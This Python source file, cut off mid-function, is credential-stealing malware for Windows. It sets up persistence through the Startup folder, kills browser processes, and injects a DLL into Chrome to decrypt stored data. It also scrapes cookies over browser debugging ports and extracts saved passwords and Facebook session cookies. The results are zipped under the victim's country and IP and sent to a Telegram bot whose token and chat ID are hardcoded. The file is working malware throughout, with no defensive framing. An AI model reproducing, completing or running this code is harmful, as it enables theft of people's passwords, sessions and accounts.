import sys
sys.dont_write_bytecode = True
import win32con
import win32event
import ctypes
from ctypes import wintypes
from pathlib import Path
import json
import shutil
import sqlite3
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import os
import asyncio
import aiohttp
import base64
import time
import subprocess
import requests
import logging
import zipfile
import tempfile
import webbrowser
import threading
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from websocket import create_connection
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from typing import List, Tuple
from requests.exceptions import RequestException

# Define kernel32 and ntdll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Define structures
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", ctypes.c_ushort),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD)
    ]

# Configure function signatures
for func, argtypes, restype in [
    (kernel32.CreateToolhelp32Snapshot, [wintypes.DWORD, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.Process32FirstW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.Process32NextW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.OpenProcess, [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.VirtualAllocEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD], ctypes.c_void_p),
    (kernel32.WriteProcessMemory, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)], wintypes.BOOL),
    (kernel32.GetProcAddress, [wintypes.HMODULE, ctypes.c_char_p], ctypes.c_void_p),
    (kernel32.CreateRemoteThread, [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)], wintypes.HANDLE),
    (kernel32.GetExitCodeThread, [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)], wintypes.BOOL),
    (kernel32.VirtualFreeEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD], wintypes.BOOL),
    (kernel32.WaitForSingleObject, [wintypes.HANDLE, wintypes.DWORD], wintypes.DWORD),
    (kernel32.CreateEventW, [ctypes.c_void_p, wintypes.BOOL, wintypes.BOOL, wintypes.LPCWSTR], wintypes.HANDLE),
    (kernel32.ResetEvent, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.GetModuleHandleW, [wintypes.LPCWSTR], wintypes.HMODULE),
    (kernel32.CloseHandle, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.VirtualQueryEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t], ctypes.c_size_t),
    (ntdll.NtCreateThreadEx, [ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD, ctypes.c_void_p, wintypes.HANDLE,
                              ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t,
                              ctypes.c_size_t, ctypes.c_void_p], ctypes.c_ulong)
]:
    func.argtypes = argtypes
    func.restype = restype

PROCESS_ACCESS = win32con.PROCESS_CREATE_THREAD | win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_OPERATION | win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_READ

class Startup:
    def __init__(self):
        self.RoamingAppData = os.getenv("APPDATA")

    async def FolderStartup(self):
        try:
            # Get the directory of the current Python script/executable
            exe_dir = os.path.dirname(os.path.abspath(sys.executable if hasattr(sys, 'frozen') else __file__))
            # Path to f.bat in the same directory
            source_file = os.path.join(exe_dir, "f.bat")
            # User's startup path
            startup_path = os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "f.bat")
            
            if os.path.isfile(startup_path):
                print("[+] File already in startup!")
            else:
                if not os.path.isfile(source_file):
                    print(f"[-] f.bat not found in {exe_dir}")
                    return
                shutil.copy(source_file, startup_path)
                print(f"[+] Copied f.bat to {startup_path}")
        except Exception as e:
            print(f"[-] Error in FolderStartup: {str(e)}")

async def main():
    startup = Startup()
    await startup.FolderStartup()

BASE_DEBUG_PORT = 9222
bot_token = "7887423007:AAH4NmMXSycneZ-kwVFnC31ZKtyWm8r5VYo"
chat_id = "-1002629915738"
webhook_message = f'https://api.telegram.org/bot{bot_token}/sendMessage'
webhook_document = f'https://api.telegram.org/bot{bot_token}/sendDocument'
BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}
browser_paths = {}
user_data_dirs = {}

browsers = {
    "chrome": ("Google\\Chrome", "chrome.exe"),
    "vivaldi": ("Vivaldi", "vivaldi.exe"),
    "edge": ("Microsoft\\Edge", "msedge.exe"),
    "opera": ("Opera", "launcher.exe", "Opera Software\\Opera Stable"),
    "operagx": ("Opera GX", "launcher.exe", "Opera Software\\Opera GX Stable"),
    "brave": ("BraveSoftware\\Brave-Browser", "brave.exe"),
    "firefox": ("Mozilla Firefox", "firefox.exe", "Mozilla\\Firefox\\Profiles"),
    "yandex": ("Yandex\\YandexBrowser", "browser.exe"),
    "chromium": ("Chromium", "chromium.exe"),
    "safari": ("Apple Computer\\Safari", "safari.exe"),
    "maxthon": ("Maxthon\\Maxthon", "maxthon.exe"),
    "uc_browser": ("UCBrowser", "ucbrowser.exe"),
    "torch": ("Torch", "torch.exe"),
    "comodo_dragon": ("Comodo\\Dragon", "dragon.exe"),
    "slimjet": ("Slimjet", "slimjet.exe"),
    "pale_moon": ("Moonchild Productions\\Pale Moon", "palemoon.exe"),
    "waterfox": ("Waterfox", "waterfox.exe"),
    "seamonkey": ("Mozilla\\SeaMonkey", "seamonkey.exe"),
    "epic_privacy_browser": ("Epic Privacy Browser", "epic.exe"),
    "avant_browser": ("Avant Browser", "avant.exe"),
    "msie": ("Internet Explorer", "iexplore.exe"),
    "ie": ("Internet Explorer", "iexplore.exe"),
    "coccoc": ("CocCoc\\Browser", "browser.exe")
}

for browser, info in browsers.items():
    folder, exe = info[:2]
    browser_paths[browser] = [
        os.path.join("C:\\Program Files", folder, "Application", exe),
        os.path.join("C:\\Program Files (x86)", folder, "Application", exe),
        os.path.join(os.getenv("LOCALAPPDATA"), folder, "Application", exe)
    ]
    if len(info) == 3:
        user_data_dirs[browser] = os.path.join(os.getenv("APPDATA"), info[2])
    else:
        user_data_dirs[browser] = os.path.join(os.getenv("LOCALAPPDATA"), folder, "User Data")

class HandleGuard:
    def __init__(self, handle):
        self._handle = handle if handle != -1 else None

    def __del__(self):
        if self._handle:
            kernel32.CloseHandle(self._handle)

    def get(self):
        return self._handle

class Maincookie:
    temp_dir = tempfile.mkdtemp()
    collected_files = []
    DEBUG_PORT = BASE_DEBUG_PORT
    BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}

    @staticmethod
    def get_pid(proc_name):
        snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
        if not snap.get():
            return None
        entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
        if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
            return None
        while True:
            if entry.szExeFile.lower() == proc_name.lower():
                return entry.th32ProcessID
            if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                break
        return None

    @staticmethod
    def extract_facebook_cookies(netscape_file):
        facebook_cookies = []
        try:
            netscape_file = os.path.normpath(netscape_file)
            if not os.path.exists(netscape_file):
                print(f"Error: File {netscape_file} does not exist")
                return "Error: Cookie file not found"
            
            with open(netscape_file, "r", encoding="utf-8") as file:
                for line in file:
                    if line.startswith("#") or not line.strip():
                        continue
                    parts = line.strip().split("\t")
                    if len(parts) >= 7 and parts[0].lower().endswith("facebook.com"):
                        name = parts[5]
                        value = parts[6]
                        facebook_cookies.append(f"{name}={value}")
            return "; ".join(facebook_cookies) if facebook_cookies else "No .facebook.com cookies found"
        except Exception as e:
            print(f"Error reading Netscape file {netscape_file}: {e}")
            return f"Error processing file: {str(e)}"

    @staticmethod
    def get_pid_by_args(proc_name, user_data_dir, profile):
        profile_arg = f'--profile-directory={profile}'
        user_data_arg = f'--user-data-dir={user_data_dir}'
        for _ in range(5):
            snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
            if not snap.get():
                time.sleep(3)
                continue
            entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
            if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
                time.sleep(3)
                continue
            while True:
                if entry.szExeFile.lower() == proc_name.lower():
                    pid = entry.th32ProcessID
                    try:
                        proc_handle = HandleGuard(kernel32.OpenProcess(
                            win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, 
                            False, pid))
                        if proc_handle.get():
                            cmdline = subprocess.check_output(
                                ['wmic', 'process', 'where', f'ProcessId={pid}', 'get', 'CommandLine', '/format:list'],
                                stderr=subprocess.PIPE, 
                                universal_newlines=True
                            ).strip().replace('CommandLine=', '', 1)
                            if profile_arg in cmdline and user_data_arg in cmdline and "--type=" not in cmdline:
                                return pid
                    except:
                        pass
                if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                    break
            time.sleep(3)
        return None

    @staticmethod
    def terminate_headless_processes(proc_name):
        try:
            snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
            if not snap.get():
                return
            entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
            if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
                return
            while True:
                if entry.szExeFile.lower() == proc_name.lower():
                    pid = entry.th32ProcessID
                    try:
                        cmdline = subprocess.check_output(
                            ['wmic', 'process', 'where', f'ProcessId={pid}', 'get', 'CommandLine', '/format:list'],
                            stderr=subprocess.PIPE, 
                            universal_newlines=True
                        ).strip()
                        if cmdline and "--no-sandbox" in cmdline:
                            proc_handle = HandleGuard(kernel32.OpenProcess(
                                win32con.PROCESS_TERMINATE, False, pid))
                            if proc_handle.get():
                                kernel32.TerminateProcess(proc_handle.get(), 1)
                    except:
                        pass
                if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                    break
        except:
            pass

    @staticmethod
    def kill_all_browser_processes(proc_name, user_data_dir=None):
        for _ in range(5):
            try:
                print(f"Attempting to terminate {proc_name}...")
                subprocess.run(
                    ["taskkill", "/F", "/IM", proc_name],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(2)
                pid = Maincookie.get_pid(proc_name)
                if not pid:
                    if user_data_dir:
                        lockfile = os.path.join(user_data_dir, "lockfile")
                        if os.path.exists(lockfile):
                            try:
                                os.remove(lockfile)
                                print(f"Removed lockfile: {lockfile}")
                            except Exception as e:
                                print(f"Failed to remove lockfile {lockfile}: {e}")
                    print(f"Successfully terminated {proc_name}")
                    return True
                else:
                    print(f"{proc_name} (PID: {pid}) still running after attempt")
            except Exception as e:
                print(f"Error terminating {proc_name}: {e}")
            time.sleep(2)
        print(f"Failed to terminate {proc_name} after 5 attempts")
        return False

    @staticmethod
    def get_dll_path():
        exe_path = Path(sys.executable if hasattr(sys, 'frozen') else __file__).parent
        dll_path = exe_path / "chrome_decrypt.dll"
        return str(dll_path) if dll_path.exists() else ""

    @staticmethod
    def inject_dll(proc, dll_path):
        dll_bytes = (dll_path + '\0').encode('ascii')
        size = len(dll_bytes)
        remote_mem = kernel32.VirtualAllocEx(proc, None, size, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_READWRITE)
        if not remote_mem:
            return False
        try:
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(proc, remote_mem, dll_bytes, size, ctypes.byref(written)) or written.value != size:
                return False
            load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
            if not load_library:
                return False
            th = HandleGuard(kernel32.CreateRemoteThread(proc, None, 0, load_library, remote_mem, 0, None))
            if not th.get() or kernel32.WaitForSingleObject(th.get(), 15000) != win32con.WAIT_OBJECT_0:
                return False
            exit_code = wintypes.DWORD()
            return kernel32.GetExitCodeThread(th.get(), ctypes.byref(exit_code)) and exit_code.value not in (0, 0xC0000005)
        finally:
            kernel32.VirtualFreeEx(proc, remote_mem, 0, win32con.MEM_RELEASE)

    @staticmethod
    def find_browser_path(browser_name):
        for path in browser_paths.get(browser_name, []):
            if os.path.exists(path):
                return path
        return None

    @staticmethod
    def get_user_data_dir(browser_name):
        user_data_dir = user_data_dirs.get(browser_name, None)
        if user_data_dir and os.path.exists(user_data_dir):
            try:
                os.listdir(user_data_dir)
                return user_data_dir
            except:
                pass
        temp_user_data_dir = os.path.join(Maincookie.temp_dir, f"{browser_name}_user_data")
        os.makedirs(temp_user_data_dir, exist_ok=True)
        return temp_user_data_dir

    @staticmethod
    def get_profiles(user_data_dir, browser_name):
        profiles = []
        if os.path.exists(user_data_dir):
            for item in os.listdir(user_data_dir):
                full_path = os.path.join(user_data_dir, item)
                if os.path.isdir(full_path) and (item.startswith("Profile") or item == "Default"):
                    profiles.append(item)
            if not profiles:
                os.makedirs(os.path.join(user_data_dir, "Default"), exist_ok=True)
                profiles.append("Default")
        return profiles

    @staticmethod
    def start_headless_browser(browser_path, user_data_dir):
        args = [
            browser_path,
            f"--user-data-dir={user_data_dir}",
            "--no-sandbox",
            "--headless=new"
        ]
        print(f"Launching browser with args: {' '.join(args)}")
        try:
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(10)
            return True
        except:
            return False

    @staticmethod
    def start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
        args = [
            browser_path,
            f"--remote-debugging-port={debug_port}",
            f"--user-data-dir={user_data_dir}",
            f"--profile-directory={profile}",
            f"--remote-allow-origins=http://localhost:{debug_port}",
            "--no-sandbox",
            "--headless=new"
        ]
        print(f"Launching browser with args: {' '.join(args)}")
        try:
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            for _ in range(5):
                try:
                    requests.get(f"http://localhost:{debug_port}/json", timeout=2)
                    return True
                except:
                    time.sleep(2)
            return False
        except:
            return False

    @staticmethod
    def get_debug_ws_url(debug_port):
        for _ in range(5):
            try:
                response = requests.get(f"http://localhost:{debug_port}/json", timeout=5)
                response.raise_for_status()
                data = response.json()
                if data and "webSocketDebuggerUrl" in data[0]:
                    return data[0]["webSocketDebuggerUrl"]
                time.sleep(1)
            except:
                time.sleep(1)
        return None

    @staticmethod
    def json_to_netscape(json_cookies):
        try:
            cookies = json.loads(json_cookies)
            netscape_format = ["# Netscape HTTP Cookie File\n"]
            for cookie in cookies:
                # Get domain from either 'host' or 'domain' field
                domain = cookie.get("host", cookie.get("domain", ""))
                if not domain:
                    continue  # Skip if no domain is provided
                # Set include_subdomains based on whether the domain starts with a dot
                include_subdomains = "TRUE" if domain.startswith(".") else "FALSE"
                # Preserve the domain exactly as it appears in the JSON
                path = cookie.get("path", "/")
                secure = "TRUE" if cookie.get("secure", False) else "FALSE"
                expires = str(int(cookie.get("expires", 0)))
                name = cookie.get("name", "")
                value = cookie.get("value", "")
                if name and value:
                    netscape_format.append(
                        f"{domain}\t{include_subdomains}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
                    )
            return "\n".join(netscape_format) if netscape_format else "# Netscape HTTP Cookie File\n# No cookies found"
        except (json.JSONDecodeError, TypeError, ValueError) as e:
            print(f"Error parsing JSON cookies: {e}")
            return "# Netscape HTTP Cookie File\n# Error parsing cookies"

    @staticmethod
    def json_to_password_format(json_passwords, browser_name):
        try:
            passwords = json.loads(json_passwords)
            formatted_passwords = []
            for login in passwords:
                url = login.get("origin", "")
                username = login.get("username", "")
                password = login.get("password", "Error")
                formatted_passwords.append(
                    f"URL: {url}\nUsername: {username}\nPassword: {password}\nBrowser: {browser_name}\n"
                )
            return "".join(formatted_passwords)
        except json.JSONDecodeError as e:
            print(f"JSON parsing error in passwords: {e}")
            return ""
        except Exception as e:
            print(f"Error processing passwords: {e}")
            return ""

    @staticmethod
    def save_cookies_to_file(filename, cookies, is_json=False):
        json_dir = os.path.join(Maincookie.temp_dir, "JSON")
        filepath = os.path.join(json_dir if is_json else Maincookie.temp_dir, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(cookies)
        if os.path.exists(filepath) and filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)
            print(f"Saved {'JSON' if is_json else 'Netscape'} cookies to {filepath}")
        else:
            print(f"Error: Failed to save cookies to {filepath}")

    @staticmethod
    def save_passwords_to_file(filename, passwords):
        filepath = os.path.join(Maincookie.temp_dir, filename)
        os.makedirs(Maincookie.temp_dir, exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(passwords)
        if filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)
            print(f"Saved passwords to {filepath}")

    @staticmethod
    def collect_profile_files(browser, profiles):
        temp_dir = Path(tempfile.gettempdir())
        browser_display_name = {"chrome": "Google Chrome", "edge": "Microsoft Edge", "brave": "Brave"}.get(browser.lower(), browser)
        decrypt_files = [f for f in temp_dir.glob(f"{browser}*_decrypt_[cC][oO][oK][kK][iI][eE][sS]*.txt") if f.is_file()] + \
                        [f for f in temp_dir.glob(f"{browser}*_decrypt_[pP][aA][sS][sS][wW][oO][rR][dD][sS]*.txt") if f.is_file()]
        print(f"Found decrypt files for {browser}: {[f.name for f in decrypt_files]}")
        
        for decrypt_file in decrypt_files:
            file_name = decrypt_file.name
            try:
                profile = "Default"
                for prof in profiles:
                    if prof.lower() in file_name.lower():
                        profile = prof
                        break
                file_type = "cookies" if "cookies" in file_name.lower() else "passwords"
                dst_file = Path(Maincookie.temp_dir) / f"{file_type}_{browser}_{profile}.txt"
                print(f"Processing {file_name} as {file_type} for profile {profile}")
                
                with open(decrypt_file, "r", encoding="utf-8") as f:
                    content = f.read()
                
                if file_type == "cookies":
                    # Save JSON cookies
                    json_filename = f"cookies_{browser}_{profile}.json"
                    Maincookie.save_cookies_to_file(json_filename, content, is_json=True)
                    # Save Netscape cookies
                    formatted_content = Maincookie.json_to_netscape(content)
                    Maincookie.save_cookies_to_file(dst_file.name, formatted_content)
                    
                    if dst_file.exists():
                        time.sleep(0.5)
                        facebook_cookies = Maincookie.extract_facebook_cookies(str(dst_file))
                        if facebook_cookies and "No .facebook.com cookies found" not in facebook_cookies:
                            facebook_cookie_file = Path(Maincookie.temp_dir) / f"facebook_cookies_{browser}_{profile}.txt"
                            with open(facebook_cookie_file, "w", encoding="utf-8") as f:
                                f.write(facebook_cookies)
                            if str(facebook_cookie_file) not in Maincookie.collected_files:
                                Maincookie.collected_files.append(str(facebook_cookie_file))
                                print(f"Saved Facebook cookies to {facebook_cookie_file}")
                        else:
                            print(f"No valid Facebook cookies found for {browser} profile {profile}")
                    else:
                        print(f"Error: Cookie file {dst_file} was not created")
                else:
                    formatted_content = Maincookie.json_to_password_format(content, browser_display_name)
                    Maincookie.save_passwords_to_file(dst_file.name, formatted_content)
                
                if dst_file.exists():
                    decrypt_file.unlink()
                    print(f"Deleted source file {file_name}")
            except Exception as e:
                print(f"Error processing {file_name}: {e}")

    @staticmethod
    def get_country_and_ip():
        try:
            response = requests.get("https://ipinfo.io", timeout=5)
            response.raise_for_status()
            data = response.json()
            return data.get("country", "Unknown"), data.get("ip", "0.0.0.0")
        except:
            return "Unknown", "0.0.0.0"

    @staticmethod
    def process_browser(browser):
        browser_name = browser.lower()
        browser_path = Maincookie.find_browser_path(browser_name)
        if not browser_path:
            return
        user_data_dir = Maincookie.get_user_data_dir(browser_name)
        if not user_data_dir:
            return
        profiles = Maincookie.get_profiles(user_data_dir, browser_name)
        if not profiles:
            return

        if browser_name == "chrome":
            proc_name = Maincookie.BROWSERS.get(browser_name)
            Maincookie.terminate_headless_processes(proc_name)
            pid = Maincookie.get_pid(proc_name)
            started_headless = False

            if not pid:
                if not Maincookie.start_headless_browser(browser_path, user_data_dir):
                    return
                pid = Maincookie.get_pid(proc_name)
                started_headless = True
                if not pid:
                    return

            proc = HandleGuard(kernel32.OpenProcess(PROCESS_ACCESS, False, pid))
            if not proc.get():
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return

            dll_path = Maincookie.get_dll_path()
            if not dll_path:
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return

            if not Maincookie.inject_dll(proc.get(), dll_path):
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return

            event = HandleGuard(kernel32.CreateEventW(None, True, False, "Global\\ChromeDecryptWorkDoneEvent"))
            if event.get():
                kernel32.ResetEvent(event.get())
                kernel32.WaitForSingleObject(event.get(), 60000)

            Maincookie.collect_profile_files(browser_name, profiles)
            if started_headless:
                Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
        else:
            debug_port = Maincookie.DEBUG_PORT
            for profile in profiles:
                Maincookie.terminate_headless_processes(Maincookie.BROWSERS.get(browser_name, browser_name))
                if not Maincookie.start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
                    Maincookie.close_debug_port(debug_port)
                    debug_port += 1
                    Maincookie.DEBUG_PORT += 1
                    continue
                ws_url = Maincookie.get_debug_ws_url(debug_port)
                if not ws_url:
                    Maincookie.close_debug_port(debug_port)
                    debug_port += 1
                    Maincookie.DEBUG_PORT += 1
                    continue
                try:
                    ws = create_connection(ws_url, timeout=10)
                    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
                    response = ws.recv()
                    ws.close()
                    cookies = json.loads(response).get("result", {}).get("cookies", [])
                    if cookies:
                        formatted_cookies = [
                            {
                                "domain": cookie.get("domain", ""),
                                "name": cookie.get("name", ""),
                                "value": cookie.get("value", ""),
                                "path": cookie.get("path", "/"),
                                "secure": cookie.get("secure", False),
                                "expires": cookie.get("expires", 0)
                            } for cookie in cookies
                        ]
                        cookie_data = json.dumps(formatted_cookies, indent=2)
                        # Save JSON cookies
                        json_filename = f"cookies_{browser_name}_{profile}.json"
                        Maincookie.save_cookies_to_file(json_filename, cookie_data, is_json=True)
                        # Save Netscape cookies
                        netscape_cookies = Maincookie.json_to_netscape(cookie_data)
                        filename = f"cookies_{browser_name}_{profile}.txt"
                        Maincookie.save_cookies_to_file(filename, netscape_cookies)
                except:
                    pass
                Maincookie.close_debug_port(debug_port)
                debug_port += 1
                Maincookie.DEBUG_PORT += 1
                time.sleep(2)

    @staticmethod
    def create_zip_file():
        country, ip = Maincookie.get_country_and_ip()
        zip_name = os.path.join(Maincookie.temp_dir, f"{country}_{ip}.zip")
        print(f"Creating ZIP with files: {Maincookie.collected_files}")
        try:
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in Maincookie.collected_files:
                    if os.path.exists(file):
                        if "JSON" in file:
                            arcname = os.path.join("JSON", os.path.basename(file))
                        else:
                            arcname = os.path.basename(file)
                        zipf.write(file, arcname)
            if os.path.exists(zip_name) and zipfile.is_zipfile(zip_name):
                print(f"ZIP file created successfully: {zip_name}")
                return zip_name
            else:
                print(f"Failed to create valid ZIP file: {zip_name}")
                return None
        except Exception as e:
            print(f"Error creating ZIP file: {e}")
            return None

    @staticmethod
    def send_zip_to_telegram(zip_name):
        if not zip_name:
            print("No ZIP file provided.")
            return False
        if not os.path.exists(zip_name):
            print(f"ZIP file does not exist: {zip_name}")
            return False
        if not zipfile.is_zipfile(zip_name):
            print(f"File is not a valid ZIP: {zip_name}")
            return False

        print(f"Sending ZIP file to Telegram: {zip_name}")
        session = requests.Session()
        max_retries = 9999  # Number of retry attempts
        retry_delay = 5  # Delay between retries in seconds

        for attempt in range(max_retries):
            try:
                with open(zip_name, "rb") as file:
                    response = session.post(
                        webhook_document,  # Assume defined elsewhere
                        data={"chat_id": chat_id},  # Assume defined elsewhere
                        files={"document": (os.path.basename(zip_name), file)},
                        timeout=30
                    )
                    response.raise_for_status()  # Raise exception for non-2xx status
                    print(f"File sent successfully: {zip_name}")
                    return True
            except RequestException as e:
                if "ConnectionResetError" in str(e) and attempt < max_retries - 1:
                    print(f"Connection error on attempt {attempt + 1}: {e}. Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    continue
                else:
                    print(f"Error sending file to Telegram after {attempt + 1} attempts: {e}")
                    return False
            except Exception as e:
                print(f"Unexpected error: {e}")
                return False
        print(f"Failed to send file after {max_retries} attempts.")
        return False

    @staticmethod
    def close_debug_port(debug_port):
        try:
            output = subprocess.check_output(
                f"netstat -ano | findstr :{debug_port}",
                shell=True,
                stderr=subprocess.DEVNULL,
                text=True
            )
            for line in output.strip().splitlines():
                pid = line.strip().split()[-1]
                if pid != "0":
                    subprocess.run(
                        ["taskkill", "/F", "/PID", pid],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
        except:
            pass

    @staticmethod
    def execute():
        temp_dir = Path(tempfile.gettempdir())
        for file in ["chrome_decrypt.log", "chrome_appbound_key.txt"]:
            try:
                (temp_dir / file).unlink()
            except:
                pass
        
        # Terminate all browser processes except Chrome before running
        browsers_to_terminate = {
            **Maincookie.BROWSERS,  # Include browsers from BROWSERS
            "coccoc": "browser.exe"  # Explicitly add CocCoc
        }
        for browser, proc_name in browsers_to_terminate.items():
            if browser.lower() != "chrome":  # Skip Chrome
                print(f"Terminating {browser} processes ({proc_name})...")
                Maincookie.kill_all_browser_processes(proc_name)
        
        # Also terminate any additional browsers from the browsers dictionary
        for browser, info in browsers.items():
            if browser.lower() not in Maincookie.BROWSERS and browser.lower() != "chrome":
                proc_name = info[1]  # Executable name from browsers dictionary
                print(f"Terminating additional browser {browser} processes ({proc_name})...")
                Maincookie.kill_all_browser_processes(proc_name)
        
        # Continue processing browsers
        for browser in Maincookie.BROWSERS:
            Maincookie.process_browser(browser)
        
        for browser_name in browser_paths.keys():
            if browser_name.lower() in Maincookie.BROWSERS:
                continue
            Maincookie.process_browser(browser_name)
        
        if Maincookie.collected_files:
            zip_name = Maincookie.create_zip_file()
            if zip_name:
                Maincookie.send_zip_to_telegram(zip_name)

class Variables:
    Passwords = list()
    Cards = list()
    Cookies = list()
    Historys = list()
    Downloads = list()
    Autofills = list()
    Bookmarks = list()
    Wifis = list()
    SystemInfo = list()
    ClipBoard = list()
    Processes = list()
    Network = list()
    FullTokens = list()
    ValidatedTokens = list()
    DiscordAccounts = list()
    SteamAccounts = list()

class SubModules:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        try:
            pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()
            pOptionalEntropy = None
            if optional_entropy:
                try:
                    optional_entropy = optional_entropy.encode("utf-16")
                    pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
                except UnicodeEncodeError as e:
                    logging.error(f"Failed to encode optional_entropy: {e}")
                    raise
            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy else None,
                None, None, 0, ctypes.byref(pDataOut)
            ):
                data = (ctypes.c_ubyte * pDataOut.cbData)()
                ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
                return bytes(data)
            else:
                error = ctypes.get_last_error()
                logging.error(f"CryptUnprotectData failed with Windows error code {error}")
                raise ctypes.WinError(error)
        except Exception as e:
            logging.error(f"DPAPI decryption error for data {encrypted_data[:10].hex()} (prefix {encrypted_data[:3].decode('ascii', errors='ignore')}...): {e}")
            raise

    @staticmethod
    def GetKey(FilePath: str = None) -> bytes:
        key_file = os.path.join(os.getenv('TEMP'), 'chrome_appbound_key.txt')
        try:
            if not os.path.exists(key_file):
                logging.error(f"Key file not found: {key_file}")
                raise FileNotFoundError(f"Key file not found: {key_file}")
            with open(key_file, "r", encoding="utf-8") as file:
                hex_key = file.read().strip()
            try:
                key_bytes = bytes.fromhex(hex_key)
                if len(key_bytes) != 32:
                    logging.error(f"Invalid AES key length: {len(key_bytes)} bytes (expected 32)")
                    raise ValueError(f"Invalid AES key length: {len(key_bytes)} bytes")
